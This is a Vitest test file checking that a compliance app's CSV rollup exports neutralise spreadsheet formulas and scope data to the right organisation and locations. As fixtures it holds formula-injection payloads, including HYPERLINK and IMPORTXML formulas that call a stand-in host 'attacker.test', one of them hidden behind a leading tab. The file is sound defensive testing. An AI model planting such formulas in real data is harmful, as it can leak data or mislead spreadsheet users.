import { beforeEach, describe, expect, it, vi } from 'vitest'

const {
  getChecklistRollupMock,
  getTaskRollupMock,
  getSessionFnMock,
  getDbMock,
  resolveActiveLocationAccessMock,
  requireFeatureForOrgMock,
} = vi.hoisted(() => ({
  getChecklistRollupMock: vi.fn(),
  getTaskRollupMock: vi.fn(),
  getSessionFnMock: vi.fn(),
  getDbMock: vi.fn(),
  resolveActiveLocationAccessMock: vi.fn(),
  requireFeatureForOrgMock: vi.fn(),
}))

vi.mock('@tanstack/react-start', () => ({
  createServerFn: vi.fn(() => ({
    handler: vi.fn((handler: () => unknown) => handler),
  })),
}))

vi.mock('@phiguard/compliance', () => ({
  getChecklistRollup: getChecklistRollupMock,
  getTaskRollup: getTaskRollupMock,
}))

vi.mock('@phiguard/billing', () => ({
  recordFeatureUsage: vi.fn(() => Promise.resolve()),
  requireFeatureForOrg: requireFeatureForOrgMock,
}))

vi.mock('@phiguard/db/server', () => ({
  getDb: getDbMock,
  organizations: {
    id: 'organizationId',
    plan: 'plan',
    planStatus: 'planStatus',
    trialEndsAt: 'trialEndsAt',
  },
}))

vi.mock('../lib/session.js', () => ({
  getSessionFn: getSessionFnMock,
}))

vi.mock('./access.js', () => ({
  assertCommercialProductAccess: vi.fn(),
  resolveActiveLocationAccess: resolveActiveLocationAccessMock,
}))

vi.mock('drizzle-orm', () => ({
  eq: vi.fn(),
}))

describe('report CSV exports', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    getSessionFnMock.mockResolvedValue({
      user: { id: 'user-1' },
      session: { activeOrganizationId: 'org-1' },
    })
    getDbMock.mockReturnValue({
      select: vi.fn().mockReturnValue({
        from: vi.fn().mockReturnValue({
          where: vi.fn().mockReturnValue({
            limit: vi.fn().mockResolvedValue([
              {
                plan: 'group',
                planStatus: 'active',
                trialEndsAt: null,
              },
            ]),
          }),
        }),
      }),
    })
    resolveActiveLocationAccessMock.mockResolvedValue({
      userId: 'user-1',
      organizationId: 'org-1',
      role: 'org_admin',
      allowedLocationIds: ['location-1'],
      canAccessAllLocations: true,
    })
    requireFeatureForOrgMock.mockImplementation(() => undefined)
  })

  it('neutralizes spreadsheet formulas in compliance rollup CSV location names', async () => {
    getChecklistRollupMock.mockResolvedValue([
      {
        locationId: 'location-1',
        locationName: '=HYPERLINK("https://attacker.test","Clinic")',
        total: 4,
        complete: 2,
        pct: 50,
      },
    ])

    const { exportComplianceRollupFn } = await import('./reports.js')

    await expect(exportComplianceRollupFn()).resolves.toContain(
      '"\'=HYPERLINK(""https://attacker.test"",""Clinic"")"',
    )
  })

  it('neutralizes spreadsheet formulas in task rollup CSV location names', async () => {
    getTaskRollupMock.mockResolvedValue([
      {
        locationId: 'location-1',
        locationName: '+SUM(1,2)',
        open: 1,
        overdue: 0,
        completed: 3,
      },
    ])

    const { exportTaskRollupFn } = await import('./reports.js')

    await expect(exportTaskRollupFn()).resolves.toContain('"\'+SUM(1,2)"')
  })

  it('neutralizes spreadsheet formulas hidden behind leading whitespace', async () => {
    getChecklistRollupMock.mockResolvedValue([
      {
        locationId: 'location-1',
        locationName: '\t=IMPORTXML("https://attacker.test","//title")',
        total: 4,
        complete: 2,
        pct: 50,
      },
    ])

    const { exportComplianceRollupFn } = await import('./reports.js')

    await expect(exportComplianceRollupFn()).resolves.toContain(
      '"\'\t=IMPORTXML(""https://attacker.test"",""//title"")"',
    )
  })

  it('uses resolved access organization instead of a stale session organization', async () => {
    getSessionFnMock.mockResolvedValue({
      user: { id: 'user-1' },
      session: { activeOrganizationId: 'org-stale' },
    })
    resolveActiveLocationAccessMock.mockResolvedValue({
      userId: 'user-1',
      organizationId: 'org-1',
      role: 'org_admin',
      allowedLocationIds: ['location-1'],
      canAccessAllLocations: true,
    })
    getChecklistRollupMock.mockResolvedValue([])

    const { exportComplianceRollupFn } = await import('./reports.js')

    await exportComplianceRollupFn()

    expect(getChecklistRollupMock).toHaveBeenCalledWith(expect.anything(), {
      tenantId: 'org-1',
      locationIds: undefined,
    })
  })

  it('passes readable location scope for location-limited rollup exports', async () => {
    resolveActiveLocationAccessMock.mockResolvedValue({
      userId: 'user-1',
      organizationId: 'org-1',
      role: 'location_staff',
      allowedLocationIds: ['location-1'],
      canAccessAllLocations: false,
    })
    getTaskRollupMock.mockResolvedValue([])

    const { exportTaskRollupFn } = await import('./reports.js')

    await exportTaskRollupFn()

    expect(getTaskRollupMock).toHaveBeenCalledWith(expect.anything(), {
      tenantId: 'org-1',
      locationIds: ['location-1'],
    })
  })
})
